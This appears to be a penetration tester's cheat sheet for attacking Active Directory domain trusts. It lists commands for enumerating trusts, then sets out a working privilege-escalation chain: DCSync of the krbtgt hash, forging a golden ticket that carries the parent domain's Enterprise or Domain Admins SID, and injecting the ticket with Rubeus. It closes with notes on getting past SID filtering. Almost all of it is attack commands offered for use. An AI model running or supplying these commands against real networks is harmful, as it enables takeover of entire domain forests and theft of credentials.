* cmd
```
nltest /trusted_domains
```
* powershell
```
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```
* powerview
```
Get-DomainTrust -API or Get-DomainTrust -NET
Get-DomainTrustMapping
Get-DomainForeignGroupMember -Domain [target domain]
```

## Bidirectional Parent/Child -- sids
```
PowerShell Get-DomainGroup -Identity 'Domain Admins' -Domain [parent domain] | select ObjectSid
Shell whoami /user
DCSync krbtgt or lsadump::dcsync /user:krbtgt /domain:[child]
kerberos::golden /user:Administrator /domain:[child domain] /sid:[child domain] /sids:[parenet domain]-512 or 519 /krbtgt:[child domain] /ticket:test.kirbi
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\John\Desktop\test.kirb")) 
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
ImpersonateProcess 2768
Rubeus triage

```

* powerview
```
Get-DomainSID -Domain [domain]
```
## SID filtering
```
Get-DomainTrust -Domain [target domain]
netdom trust [From] /d:[To] /enablesidhistory:yes  (This will add TREAT_AS_EXTERNAL to TrustAttributes)
```
* Need to find a custom group in domain local security groups and change sids to this group
```
Get-DomainGroupMember -Identity "Administrators" -Domain [target domain]
```
